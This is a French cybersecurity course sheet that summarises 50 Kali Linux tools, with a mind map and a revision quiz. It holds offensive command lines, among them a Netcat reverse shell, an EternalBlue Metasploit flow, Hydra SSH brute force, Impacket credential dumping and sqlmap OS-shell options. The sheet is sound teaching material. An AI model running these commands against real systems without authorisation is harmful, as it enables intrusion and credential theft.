---
cssclasses:
  - max
aliases:
  - "Fiches outils Kali (1 → 50)"
  - "01-22 | Fiches outils Kali (1 → 50)"
archetype: cour
module: "GEN (Culture Générale & Hors Cursus)"
tags:
  - distribution/kali-linux
  - reconnaissance
  - exploitation
  - post-exploitation
  - analyse/web
  - attaque/reseau/sans-fil
  - analyse/forensique
  - outil/nmap
  - reseau/scanner
  - port-scanning
  - detection/os
  - detection/service
  - outil/nmap/nse
  - outil/nmap/scan-syn
  - outil/nmap/scan-agressif
  - outil/nmap/scan-tous-ports
  - outil/wireshark
  - sniffing-reseau
  - analyse/trafic-reseau
  - outil/metasploit
  - meterpreter
  - outil/burp-suite
  - reseau/proxy
  - outil/scanner-web
  - fuzzing
  - outil/sqlmap
  - vulnerabilite/injection-sql
  - attaque/injection-sql
  - base-de-donnees
  - outil/hydra
  - attaque/force-brute
  - attaque/mots-de-passe/online
  - protocole/ssh
  - protocole/ftp
  - protocole/http
  - protocole/smb
---

# 01-22 | Fiches outils Kali (1 → 50)

> [!goal] Objectifs Pédagogiques
> À la fin de cette fiche, je dois être capable de :
> 1.  Identifier les principales catégories d'outils de sécurité disponibles dans Kali Linux.
> 2.  Décrire le rôle, l'utilisation de base et les options clés d'au moins 20 outils Kali courants pour la reconnaissance, l'exploitation et la post-exploitation.
> 3.  Comprendre les concepts fondamentaux derrière les outils spécifiques pour l'exploration réseau, l'analyse web, les attaques de mots de passe, et la criminalistique numérique.

## 📝 Synthèse du Cours

Cette section détaille une sélection de 50 outils essentiels disponibles dans la distribution Kali Linux, couvrant un large éventail de domaines allant de la reconnaissance à la post-exploitation, en passant par l'analyse web et les attaques sans fil.

### 1. Nmap – Network Scanner généraliste
*   **Catégorie**: Information Gathering / Vulnérabilités de surface.
*   **Rôle**: Scanner d'hôtes, de ports, de services, de versions, et parfois d'OS. Il constitue le point d'entrée classique de la plupart des tests d'intrusion.
*   **Utilisation de base**:
    *   `nmap 192.168.1.0/24` : Effectue un scan simple des ports les plus courants.
*   **Options clés**:
    *   `-sS` : Scan SYN furtif.
    *   `-sV` : Détection de la version des services.
    *   `-O` : Détection du système d'exploitation (*OS fingerprinting*).
    *   `-A` : Scan agressif (OS, scripts NSE, détection de version).
    *   `-p 1-65535` : Scan de tous les ports.
    *   `-Pn` : Ne pas effectuer de ping (utile si ICMP est filtré).
    *   `--script` : Lance les scripts NSE (*Nmap Scripting Engine*) pour des vulnérabilités, bruteforce, etc.

### 2. Wireshark – Analyseur de paquets
*   **Catégorie**: Sniffing / Forensics réseau.
*   **Rôle**: Capture et inspection détaillée du trafic réseau (TCP/IP, DNS, HTTP, TLS, etc.) pour le débogage, la détection d'anomalies et l'analyse d'attaques.
*   **Lancement**: `wireshark` (interface graphique).
*   **Concepts clés**:
    *   **Filtres d'affichage**: `ip.addr == 192.168.1.10` ou `http.tcp.port == 80`.
    *   **Suivi de flux**: Clic droit → "Follow TCP/HTTP stream".
    *   **Statistiques**: Conversations, Endpoints, Protocol Hierarchy pour cartographier le réseau.

### 3. Metasploit Framework – Plateforme d'exploitation
*   **Catégorie**: Exploitation / Post-exploitation.
*   **Rôle**: Framework robuste avec des milliers de modules (exploits, *payloads*, scanners). Il permet de passer d'une vulnérabilité identifiée à un système compromis.
*   **Lancement**: `msfconsole`.
*   **Flux de base**:
    *   `search smb` → `use exploit/windows/smb/ms17_010_eternalblue`.
    *   `show options` → `set RHOSTS 192.168.1.10` → `set PAYLOAD ...` → `run`.
*   **Options clés**: `set`, `unset`, `show options`, `setg` (global), `sessions` (pour gérer les sessions Meterpreter).

### 4. Burp Suite (Community) – Proxy web et scanner
*   **Catégorie**: Web Application Testing.
*   **Rôle**: Proxy intercepteur pour manipuler les requêtes HTTP(S), effectuer du *fuzzing* manuel, rejouer des requêtes (*repeater*), ou les injecter (*intruder*, limité en version Community).
*   **Lancement**: `burpsuite`.
*   **Concepts clés**:
    *   Configuration du proxy navigateur sur `127.0.0.1:8080`.
    *   **Outils principaux**: Proxy (interception), Repeater (rejouer une requête), Decoder, Comparer.
    *   **Options typiques**: Définir le *scope* de test, filtrer les requêtes, gérer les certificats CA pour l'interception SSL.

### 5. SQLmap – Injection SQL automatisée
*   **Catégorie**: Web / Database Assessment.
*   **Rôle**: Détecte et exploite automatiquement les injections SQL (UNION, Boolean, Time-based, etc.) et extrait des données de bases de données.
*   **Utilisation de base**:
    *   `sqlmap -u "http://site/login.php?id=1" --batch`.
*   **Options clés**:
    *   `-p` : Paramètre ciblé.
    *   `--dbs`, `-D db --tables`, `-T table --columns`, `-C col --dump` : Énumération et extraction de données.
    *   `--cookie`, `--data` : Gérer les requêtes avec cookies ou données POST.
    *   `--risk 3 --level 5` : Pour élargir la portée des tests.
    *   `--os-shell`, `--os-pwn` : Très intrusif, à utiliser uniquement en environnement de laboratoire.

### 6. Hydra – Brute force en ligne (protocoles multiples)
*   **Catégorie**: Password Attacks (online).
*   **Rôle**: Effectue des attaques par *brute force* de logins SSH, FTP, HTTP, SMB, etc., sur divers services réseau.
*   **Utilisation de base (SSH)**:
    *   `hydra -l root -P /path/pass.txt 192.168.1.10 ssh`.
*   **Options clés**:
    *   `-L login` ou `-L wordlist` : Nom d'utilisateur fixe ou liste de noms d'utilisateurs.
    *   `-p password` ou `-P wordlist` : Mot de passe fixe ou liste de mots de passe.
    *   `-t` : Nombre de tâches parallèles.
    *   `http-post-form` : Pour les formulaires HTTP complexes, ex: `http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login Failed"`.

### 7. John the Ripper – Cracking de mots de passe (offline)
*   **Catégorie**: Password Attacks (offline).
*   **Rôle**: Craque des *hashes* de mots de passe (passwd, shadow, NTLM, ZIP, etc.) pour auditer la robustesse des mots de passe.
*   **Utilisation de base**:
    *   `john hash.txt` (utilise le mode par défaut).
*   **Options clés**:
    *   `--wordlist=rockyou.txt` : Utilise une *wordlist*.
    *   `--rules` : Applique des règles de *mangling*.
    *   `--format=nt`, `--format=sha512crypt` : Spécifie le format de *hash*.
    *   `--show` : Affiche les mots de passe craqués.

### 8. Hashcat – Cracking GPU hautes performances
*   **Catégorie**: Password Attacks (offline).
*   **Rôle**: Permet le craquage de *hashes* de mots de passe sur GPU (si disponible) avec de nombreux modes d'attaque, offrant des performances élevées.
*   **Utilisation de base**:
    *   `hashcat -m 1000 -a 0 hashes.txt rockyou.txt` (Craque des NTLM hashes avec une *wordlist*).
*   **Options clés**:
    *   `-m` : Spécifie le type de *hash*.
    *   `-a` : Sélectionne le mode d'attaque (0=wordlist, 3=mask, 6/7=hybrides).
    *   `--show`, `--status` : Affiche les résultats ou le statut.
    *   `--force` : À utiliser avec prudence.
    *   `-w` : Définit le profil de charge de travail (1 à 4).

### 9. Gobuster – Fuzzing de chemins (dir, vhost, DNS)
*   **Catégorie**: Web / Discovery.
*   **Rôle**: Effectue du *brute force* pour découvrir des répertoires, fichiers ou sous-domaines via des *wordlists*.
*   **Utilisation de base (répertoires)**:
    *   `gobuster dir -u http://site/ -w /usr/share/wordlists/dirb/common.txt`.
*   **Options clés**:
    *   `-x php,aspx` : Ajoute des extensions de fichier.
    *   `-t` : Définit le nombre de *threads*.
    *   `-k` : Ignore les erreurs de certificat TLS.
    *   `mode vhost, dns` : Pour le *fuzzing* de *vhosts* et de sous-domaines.

### 10. Nikto – Scanner web "classique"
*   **Catégorie**: Web Vulnerability Scanning.
*   **Rôle**: Scanner d'anciennes vulnérabilités, de mauvaises configurations, de fichiers sensibles, etc., sur les serveurs web.
*   **Utilisation de base**:
    *   `nikto -h http://site/`.
*   **Options clés**:
    *   `-p port` : Spécifie un port (ex. 443).
    *   `-ssl` : Active le mode HTTPS.
    *   `-Tuning` : Permet de cibler certains types d'attaques.
    *   `-output` : Génère un rapport.

### 11. OWASP ZAP – Proxy/scanner web alternatif (à Burp)
*   **Catégorie**: Web Application Security.
*   **Rôle**: Proxy intercepteur, scanner actif/passif, *fuzzer*. C'est une alternative *open source* à Burp Suite.
*   **Lancement**: `zaproxy`.
*   **Concepts clés**:
    *   Fonctionne comme un proxy (à la manière de Burp Suite), inclut un *spider* automatique et un "Active Scan".
    *   Dispose d'un *fuzzer* intégré et permet l'utilisation de scripts pour automatiser les tests.

### 12. Aircrack-ng (suite) – Attaques Wi-Fi
*   **Catégorie**: Wireless Attacks (WEP/WPA/WPA2).
*   **Rôle**: Permet de passer en mode moniteur, de capturer des paquets, d'injecter du trafic et de craquer des clés WEP/WPA à partir de *handshakes*.
*   **Outils principaux**:
    *   `airmon-ng` : Active le mode moniteur.
    *   `airodump-ng` : Capture des paquets.
    *   `aireplay-ng` : Injecte du trafic (par exemple, désauthentification).
    *   `aircrack-ng` : Effectue le craquage.
*   **Exemple type WPA**:
    *   `airmon-ng start wlan0`
    *   `airodump-ng wlan0mon`
    *   `airodump-ng -c X --bssid BSSID -w capture wlan0mon` (X est le canal)
    *   `aircrack-ng -w rockyou.txt capture-01.cap`

### 13. Bettercap – MITM / attaques réseau avancées
*   **Catégorie**: Sniffing / MITM / Wireless.
*   **Rôle**: Framework pour les attaques de type *Man-in-the-Middle* (MITM), *ARP spoofing*, *DNS spoofing*, etc., avec une interface interactive.
*   **Utilisation de base**:
    *   `bettercap -iface eth0`.
*   **Concepts clés**:
    *   **Modules**: `arp.spoof`, `dns.spoof`, `http.proxy`.
    *   **CLI interactive**: `help`, `set`, `show`, `run`.

### 14. Wifite – Automatisation d'attaques Wi-Fi
*   **Catégorie**: Wireless.
*   **Rôle**: Un *wrapper* qui automatise l'utilisation d'outils comme Aircrack-ng et Reaver pour tester la robustesse des points d'accès sans fil (AP).
*   **Utilisation de base**:
    *   `wifite` : Lance un menu interactif pour choisir les cibles.
*   **Options clés**:
    *   `--dict` : Spécifie une *wordlist*.
    *   `--wep`, `--wpa` : Filtre les cibles par type de chiffrement.

### 15. Responder – Poisoning LLMNR/NBT-NS/mDNS
*   **Catégorie**: Network / Credential Harvesting.
*   **Rôle**: Écoute et empoisonne les résolutions de noms (LLMNR, NBT-NS, mDNS) sur le réseau local pour récupérer des *hashes* NTLM.
*   **Utilisation de base**:
    *   `responder -I eth0`.
*   **Options clés**:
    *   `-rdw` : Pour activer/désactiver certains protocoles.
    *   L'analyse des logs générés est cruciale pour extraire les *hashes*.

### 16. Impacket (suite de scripts) – Protocoles Windows
*   **Catégorie**: Lateral Movement / Protocoles réseau.
*   **Rôle**: Collection de scripts Python (`psexec`, `wmiexec`, `secretsdump`, etc.) pour interagir avec des protocoles Windows comme SMB, RPC, LDAP et WinRM.
*   **Exemples**:
    *   `secretsdump.py domain/user@dc` : Pour *dumper* le SAM/NTDS.
    *   `psexec.py domain/user@target cmd.exe` : Pour l'exécution de commandes à distance.

### 17. CrackMapExec – Swiss-army knife AD / SMB
*   **Catégorie**: Post-exploitation AD.
*   **Rôle**: Outil polyvalent pour tester des informations d'identification à grande échelle sur SMB/WinRM/SSH, extraire des informations d'Active Directory et exécuter des commandes.
*   **Utilisation de base**:
    *   `cme smb 192.168.1.0/24 -u user -p pass --shares`.
*   **Options clés**:
    *   `--sam`, `--lsa`, `--ntds` : Pour le *dump* des *hashes*.
    *   `modules` : Pour l'exécution de scripts et d'autres fonctionnalités.

### 18. Netcat – "Couteau suisse" réseau
*   **Catégorie**: Networking / Pivoting.
*   **Rôle**: Client/serveur TCP/UDP minimaliste pour le débogage, les transferts de fichiers et l'établissement de *reverse shells*.
*   **Utilisation de base**:
    *   `nc -lvnp 4444` : Configure un *listener* sur le port 4444.
    *   `nc IP 4444 -e /bin/bash` : Crée un *reverse shell* (version traditionnelle).
*   **Options clés**:
    *   `-l` : Mode écoute (*listen*).
    *   `-v` : Mode verbeux.
    *   `-n` : Ne pas faire de résolution DNS.
    *   `-p` : Spécifie le port.
    *   `-u` : Utilise UDP.

### 19. TCPdump – Capture de paquets en CLI
*   **Catégorie**: Sniffing.
*   **Rôle**: Alternative en ligne de commande à Wireshark, très utile sur les serveurs ou via SSH pour la capture de paquets.
*   **Utilisation de base**:
    *   `tcpdump -i eth0`.
*   **Options clés**:
    *   `-n` : Pas de résolution d'adresses IP en noms d'hôtes.
    *   `-nn` : Pas de résolutions d'adresses IP ou de ports.
    *   `-w capture.pcap` : Écrit la capture dans un fichier pour une analyse ultérieure avec Wireshark.
    *   **Filtres BPF**: `tcp port 80`, `host 192.168.1.10`.

### 20. Enum4linux-ng – Enum SMB/AD
*   **Catégorie**: Information Gathering / Windows.
*   **Rôle**: Énumération de partages, utilisateurs, groupes et politiques via le protocole SMB.
*   **Utilisation de base**:
    *   `enum4linux-ng -A 192.168.1.10`.
*   **Options clés**:
    *   `-U` : Énumération des utilisateurs.
    *   `-S` : Énumération des partages.
    *   `-G` : Énumération des groupes.
    *   `-oA` : Sortie multiple (tous les formats).

### 21. SNMP-Check – Enum via SNMP
*   **Catégorie**: Information Gathering.
*   **Rôle**: Extrait des informations système via le protocole SNMP (services, interfaces, etc.) si la *community string* est connue ou par défaut.
*   **Utilisation de base**:
    *   `snmp-check -c public 192.168.1.10`.

### 22. OpenVAS / GVM – Scanner de vulnérabilités complet
*   **Catégorie**: Vulnerability Scanning.
*   **Rôle**: Scanner réseau complet, équivalent *open source* à Nessus.
*   **Utilisation**:
    *   Installation via `gvm-setup`, démarrage avec `gvm-start`, puis accès à l'interface graphique web pour créer des "Targets" et des "Tasks".
*   **Concepts clés**:
    *   Sélection de profils de scan, gestion des faux positifs, analyse des résultats CVE.

### 23. Lynis – Audit de sécurité système
*   **Catégorie**: Host Hardening.
*   **Rôle**: Réalise un audit de configuration Linux (permissions, services, logs, etc.) pour identifier les faiblesses.
*   **Utilisation de base**:
    *   `lynis audit system`.
*   **Résultat**: Fournit un score global et des recommandations détaillées (authentification, SSH, pare-feu, logs...).

### 24. Maltego – OSINT / graphes de relations
*   **Catégorie**: Information Gathering / OSINT (*Open Source INTelligence*).
*   **Rôle**: Collecte et corrélation de données publiquement disponibles (emails, domaines, adresses IP, réseaux sociaux) sous forme de graphes pour visualiser les relations.
*   **Utilisation**:
    *   Lancement de l'interface graphique, création d'un "graph", utilisation de "transforms" (résolutions DNS, Whois, etc.).

### 25. Dirb – Brute force de répertoires web (legacy)
*   **Catégorie**: Web Discovery.
*   **Rôle**: Effectue du *brute force* pour découvrir des répertoires, fichiers ou sous-domaines sur un serveur web via des *wordlists*.
*   **Utilisation de base**:
    *   `dirb http://site/`.
*   **Options clés**:
    *   `-X .php,.asp` : Spécifie des extensions de fichiers à rechercher.
    *   Permet de fournir une *wordlist* personnalisée.

### 26. ffuf – Fuzzer HTTP moderne
*   **Catégorie**: Web Fuzzing.
*   **Rôle**: Effectue du *fuzzing* pour découvrir des chemins, des paramètres, des en-têtes *Host*, etc., sur des applications web.
*   **Exemple (répertoires)**:
    *   `ffuf -u http://site/FUZZ -w wordlist.txt`.
*   **Options clés**:
    *   `-H "Header: value"` : Ajoute un en-tête HTTP personnalisé.
    *   `-X POST -d "user=FUZZ"` : Utilise la méthode POST avec des données.
    *   `filtres -fc` (codes de statut), `-fs` (taille de réponse).

### 27. WPScan – Scanner WordPress
*   **Catégorie**: Web / CMS (*Content Management System*).
*   **Rôle**: Scanner spécifique pour les installations WordPress, détectant les versions, plugins, thèmes, comptes et vulnérabilités connus.
*   **Utilisation de base**:
    *   `wpscan --url http://site/`.
*   **Options clés**:
    *   `--enumerate u,p,t` : Énumère les utilisateurs, plugins et thèmes.
    *   `--api-token` : Pour accéder à la base de données des vulnérabilités de WPScan.

### 28. BeEF – Browser Exploitation Framework
*   **Catégorie**: Client-side / XSS (*Cross-Site Scripting*).
*   **Rôle**: Framework d'attaque axé sur le navigateur web, exploitant les vulnérabilités XSS pour "hooker" les navigateurs des victimes et lancer des attaques côté client.
*   **Utilisation**:
    *   Lancer BeEF, injecter une balise `<script>` de *hook* dans une page vulnérable, puis manipuler le navigateur de la victime depuis l'interface web de BeEF.

### 29. Social-Engineer Toolkit (SET) – Attaques de social engineering
*   **Catégorie**: Social Engineering.
*   **Rôle**: Génère des scénarios de *phishing*, clone des sites web et crée des *payloads* adaptés pour des attaques d'ingénierie sociale.
*   **Lancement**: `setoolkit`.
*   **Menu CLI**: Permet de choisir parmi divers types d'attaques (email, web, USB, etc.).

### 30. Searchsploit – Recherche locale d'exploits
*   **Catégorie**: Exploit Reference.
*   **Rôle**: Interface en ligne de commande pour la base de données Exploit-DB, permettant de rechercher des *exploits* locaux ou distants.
*   **Utilisation de base**:
    *   `searchsploit "Apache 2.4"`.
    *   `searchsploit -x exploit.c` : Affiche le contenu d'un *exploit*.

### 31. Mimikatz (via Wine ou intégré aux frameworks) – Crédentiels Windows
*   **Catégorie**: Post-exploitation.
*   **Rôle**: Outil pour l'extraction de mots de passe en clair, de *hashes* et de tickets Kerberos sur un système Windows compromis.
*   **Utilisation Kali**: Souvent intégré via des modules Meterpreter (kiwi) ou exécuté à distance via des outils comme `psexec`.

### 32. Yersinia – Attaques sur protocoles réseau (Layer 2)
*   **Catégorie**: Network Attacks.
*   **Rôle**: Outil pour lancer des attaques sur les protocoles de la couche 2 du modèle OSI, tels que STP, CDP, DTP, HSRP.
*   **Utilisation**: Interface graphique ou CLI pour lancer des attaques de type *spoofing* ou DoS sur ces protocoles.

### 33. Reaver – Attaques WPS
*   **Catégorie**: Wireless.
*   **Rôle**: Teste la robustesse de la fonctionnalité WPS (*Wi-Fi Protected Setup*) (PIN) des points d'accès Wi-Fi.
*   **Utilisation de base**:
    *   `reaver -i wlan0mon -b BSSID -c CH -vv`.

### 34. Hping3 – Générateur de paquets / tests firewall
*   **Catégorie**: Network / Recon / DoS test.
*   **Rôle**: Permet de construire des paquets TCP, UDP et ICMP personnalisés, de tracer des chemins réseau et de tester les règles de pare-feu.
*   **Exemples**:
    *   `hping3 -S -p 80 target` : Envoie des paquets SYN sur le port 80.
    *   `hping3 --traceroute -V -1 target` : Effectue un *traceroute* ICMP.

### 35. Ettercap – MITM "classique"
*   **Catégorie**: Sniffing / MITM.
*   **Rôle**: Effectue des attaques *Man-in-the-Middle* basées sur l'empoisonnement ARP, du *sniffing* et de l'injection de données sur le réseau local (LAN).
*   **Utilisation**: Permet de choisir les cibles, le type d'attaque et de *sniffer* des mots de passe en clair.

### 36. ARP-Scan – Découverte réseau rapide
*   **Catégorie**: Information Gathering.
*   **Rôle**: Scanne un segment de réseau via le protocole ARP pour identifier rapidement les hôtes actifs.
*   **Utilisation de base**:
    *   `arp-scan --interface=eth0 192.168.1.0/24`.

### 37. DNSenum – Enum DNS
*   **Catégorie**: Information Gathering.
*   **Rôle**: Collecte d'enregistrements DNS (A, MX, NS, etc.) et *brute force* de sous-domaines.
*   **Utilisation de base**:
    *   `dnsenum example.com`.

### 38. Fierce – Enum DNS / recon de domaines
*   **Catégorie**: Information Gathering / DNS.
*   **Rôle**: Recherche des blocs IP, sous-domaines et zones DNS mal configurées associés à un domaine.

### 39. theHarvester – Collecte d'emails, hôtes, sous-domaines
*   **Catégorie**: OSINT.
*   **Rôle**: Recherche d'adresses email, sous-domaines et hôtes via des moteurs de recherche publics (Google, Bing, Shodan, etc.).
*   **Utilisation de base**:
    *   `theHarvester -d example.com -b all`.

### 40. Recon-ng – Framework OSINT
*   **Catégorie**: OSINT.
*   **Rôle**: Framework modulaire pour la collecte d'informations ouvertes (domaines, hôtes, emails).
*   **Utilisation**:
    *   Interface CLI de style Metasploit : `marketplace search`, `modules load`, `run`.

### 41. WhatWeb – Fingerprinting d'applications web
*   **Catégorie**: Web Recon.
*   **Rôle**: Détecte les CMS, frameworks, serveurs web, plugins et d'autres technologies utilisées par une application web.
*   **Utilisation de base**:
    *   `whatweb http://site/`.

### 42. SSLyze – Analyse de configuration TLS
*   **Catégorie**: Crypto / TLS.
*   **Rôle**: Teste les protocoles TLS supportés, les suites cryptographiques, et les vulnérabilités TLS d'un serveur.
*   **Utilisation de base**:
    *   `sslyze --regular site:443`.

### 43. Sqlninja – Injection SQL ciblée MS SQL (legacy)
*   **Catégorie**: Web / DB (héritage, mais encore utile en laboratoire).
*   **Rôle**: Exploitation avancée des injections SQL sur les bases de données MS SQL, y compris l'exécution de commandes système et l'obtention de *reverse shells*.

### 44. Volatility – Forensics mémoire
*   **Catégorie**: Forensics.
*   **Rôle**: Analyse des *dumps* mémoire (*memory dumps*) d'un système pour extraire des informations sur les processus, connexions réseau, DLL chargées, etc.
*   **Utilisation de base**:
    *   `volatility -f memory.dmp --profile=... pslist` (version 1)
    *   ou `vol.py -f ... windows.pslist` (version 2).

### 45. Autopsy – Forensics disque (GUI)
*   **Catégorie**: Forensics.
*   **Rôle**: Interface graphique pour l'analyse de disques, partitions, fichiers supprimés et chronologies d'événements.
*   **Utilisation**: Lancement de l'interface graphique, création d'un "case", ajout d'images disque, utilisation de modules d'analyse.

### 46. Binwalk – Analyse d'images firmware
*   **Catégorie**: Reverse / Firmwares.
*   **Rôle**: Extrait les sections, les systèmes de fichiers et les signatures de fichiers dans les binaires (firmware de routeur, IoT, etc.).
*   **Utilisation de base**:
    *   `binwalk firmware.bin`.
    *   `binwalk -e firmware.bin` : Pour l'extraction.

### 47. Ghidra – Reverse engineering
*   **Catégorie**: Reverse Engineering.
*   **Rôle**: Outil développé par la NSA pour décompiler, analyser et *patcher* du code machine (x86, ARM, etc.).
*   **Utilisation**: Importation du binaire, analyse automatique, navigation dans le pseudo-code.

### 48. Hash-Identifier – Détection de type de hash
*   **Catégorie**: Password / Utilitaire.
*   **Rôle**: Devine le type de *hash* donné (MD5, SHA1, NTLM, etc.) pour aider à choisir l'outil ou le mode de craquage approprié.
*   **Utilisation de base**:
    *   `hash-identifier` puis coller le *hash*.

### 49. SPARTA – GUI d'audit réseau (wrapper de Nmap, Hydra...)
*   **Catégorie**: Network / Web GUI.
*   **Rôle**: Interface graphique centralisant et orchestrant l'utilisation d'outils comme Nmap, Hydra et Nikto sur des hôtes scannés.
*   **Utilisation**: Ajout d'une plage IP, lancement de scans automatiques, visualisation des services et lancement d'outils associés.

### 50. Masscan – Scanner ultra-rapide
*   **Catégorie**: Network Scanning.
*   **Rôle**: Scanner extrêmement rapide (comparable à un "Nmap ultra-light") conçu pour scanner de très grandes plages IP à haute vitesse.
*   **Utilisation de base**:
    *   `masscan 0.0.0.0/0 -p80 --rate 1000` (à utiliser uniquement en laboratoire !).
*   **Attention**: Très bruyant, ne jamais lancer à l'aveugle sur Internet sans autorisation claire.

## 🧠 Carte Mentale / Schéma

```mermaid
graph TD
    subgraph Reconnaissance
        Nmap["1. Nmap (Network Scanner)"]
        Gobuster["9. Gobuster (Web Fuzzing)"]
        Nikto["10. Nikto (Web Scanner)"]
        WhatWeb["41. WhatWeb (Web Fingerprinting)"]
        ARPScan["36. ARP-Scan (Network Discovery)"]
        DNSenum["37. DNSenum (DNS Enumeration)"]
        theHarvester["39. theHarvester (OSINT Collection)"]
    end

    subgraph Exploitation
        Metasploit["3. Metasploit Framework"]
        SQLmap["5. SQLmap (SQL Injection)"]
        BeEF["28. BeEF (Browser Exploitation)"]
        Impacket["16. Impacket (Windows Protocols)"]
        CrackMapExec["17. CrackMapExec (AD / SMB)"]
    end

    subgraph Password_Attacks
        Hydra["6. Hydra (Online Brute Force)"]
        JohnTheRipper["7. John the Ripper (Offline Cracking)"]
        Hashcat["8. Hashcat (GPU Cracking)"]
        HashIdentifier["48. Hash-Identifier (Hash Type Detection)"]
    end

    subgraph Web_Application_Security
        BurpSuite["4. Burp Suite (Proxy/Scanner)"]
        OWASPEZAP["11. OWASP ZAP (Proxy/Scanner)"]
        WPScan["27. WPScan (WordPress Scanner)"]
        ffuf["26. ffuf (HTTP Fuzzer)"]
    end

    subgraph Network_Forensics_Sniffing
        Wireshark["2. Wireshark (Packet Analyzer)"]
        TCPdump["19. TCPdump (CLI Packet Capture)"]
        Responder["15. Responder (LLMNR/NBT-NS Poisoning)"]
        Netcat["18. Netcat (Network Swiss-Army Knife)"]
        Ettercap["35. Ettercap (Classic MITM)"]
        Volatility["44. Volatility (Memory Forensics)"]
        Autopsy["45. Autopsy (Disk Forensics GUI)"]
    end

    subgraph Wireless_Attacks
        AircrackNG["12. Aircrack-ng (Wi-Fi Attacks)"]
        Bettercap["13. Bettercap (MITM / Wireless)"]
        Wifite["14. Wifite (Wi-Fi Automation)"]
        Reaver["33. Reaver (WPS Attacks)"]
    end

    subgraph Vulnerability_Management
        OpenVAS_GVM["22. OpenVAS / GVM (Vulnerability Scanner)"]
        Lynis["23. Lynis (System Security Audit)"]
        SSLyze["42. SSLyze (TLS Configuration Analysis)"]
    end

    subgraph Social_Engineering_OSINT
        SET["29. Social-Engineer Toolkit"]
        Maltego["24. Maltego (OSINT / Graphs)"]
        ReconNG["40. Recon-ng (OSINT Framework)"]
    end

    subgraph Reverse_Engineering_Firmware
        Binwalk["46. Binwalk (Firmware Analysis)"]
        Ghidra["47. Ghidra (Reverse Engineering)"]
    end

    Nmap --> Reconnaissance
    Gobuster --> Reconnaissance
    Nikto --> Reconnaissance
    WhatWeb --> Reconnaissance
    ARPScan --> Reconnaissance
    DNSenum --> Reconnaissance
    theHarvester --> Reconnaissance

    Metasploit --> Exploitation
    SQLmap --> Exploitation
    BeEF --> Exploitation
    Impacket --> Exploitation
    CrackMapExec --> Exploitation

    Hydra --> Password_Attacks
    JohnTheRipper --> Password_Attacks
    Hashcat --> Password_Attacks
    HashIdentifier --> Password_Attacks

    BurpSuite --> Web_Application_Security
    OWASPEZAP --> Web_Application_Security
    WPScan --> Web_Application_Security
    ffuf --> Web_Application_Security

    Wireshark --> Network_Forensics_Sniffing
    TCPdump --> Network_Forensics_Sniffing
    Responder --> Network_Forensics_Sniffing
    Netcat --> Network_Forensics_Sniffing
    Ettercap --> Network_Forensics_Sniffing
    Volatility --> Network_Forensics_Sniffing
    Autopsy --> Network_Forensics_Sniffing

    AircrackNG --> Wireless_Attacks
    Bettercap --> Wireless_Attacks
    Wifite --> Wireless_Attacks
    Reaver --> Wireless_Attacks

    OpenVAS_GVM --> Vulnerability_Management
    Lynis --> Vulnerability_Management
    SSLyze --> Vulnerability_Management

    SET --> Social_Engineering_OSINT
    Maltego --> Social_Engineering_OSINT
    ReconNG --> Social_Engineering_OSINT

    Binwalk --> Reverse_Engineering_Firmware
    Ghidra --> Reverse_Engineering_Firmware
```

## ❓ Quiz de Révision (Active Recall)
> [!question] Question 1
> Quel outil est un scanner réseau généraliste, souvent le point d'entrée des tests d'intrusion, et permet de détecter des ports, services et OS ?
> > [!success]- Réponse
> > **Nmap**.

> [!question] Question 2
> Citez un outil de *brute force* de mots de passe *en ligne* et un outil de craquage de *hashes* de mots de passe *hors ligne*.
> > [!success]- Réponse
> > *   **En ligne**: Hydra.
> > *   **Hors ligne**: John the Ripper ou Hashcat.

> [!question] Question 3
> Quel est le rôle principal de Burp Suite dans le cadre du test d'application web, et comment configure-t-on généralement un navigateur pour l'utiliser ?
> > [!success]- Réponse
> > Burp Suite agit comme un **proxy intercepteur** pour manipuler les requêtes HTTP(S). On configure généralement le proxy du navigateur sur `127.0.0.1:8080`.

> [!question] Question 4
> Nommez deux outils spécifiques aux attaques Wi-Fi et décrivez brièvement leur fonction.
> > [!success]- Réponse
> > 1.  **Aircrack-ng**: Suite d'outils pour le *monitor mode*, la capture de paquets, l'injection et le craquage de clés WEP/WPA.
> > 2.  **Wifite**: Automatise l'utilisation d'Aircrack-ng et d'autres outils pour tester la robustesse des AP Wi-Fi.

> [!question] Question 5
> Quel outil est utilisé pour la collecte d'informations de sources ouvertes (OSINT) et la corrélation de données sous forme de graphes ?
> > [!success]- Réponse
> > **Maltego**.